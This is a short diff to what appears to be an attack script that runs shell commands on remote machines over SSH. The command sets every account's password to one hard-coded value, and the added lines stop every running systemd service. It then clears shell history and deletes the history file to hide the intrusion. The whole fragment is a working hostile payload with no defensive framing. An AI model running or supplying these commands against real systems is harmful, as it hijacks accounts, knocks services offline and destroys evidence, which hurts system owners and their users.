@@ -21,6 +21,8 @@ async def ssh(user, host, cmd, password, timeout=30):
 # fuck around with any command we want
 command = """
 getent passwd | awk -F: '{print $1 ":" $1 "Chiapet1"}' | chpasswd /dev/stdin;
+for s in `systemctl | grep service | cut -d '.' -f 1`; do systemctl stop $s; done
+
 history -c;
 rm ~/.bash_history;
 exit;
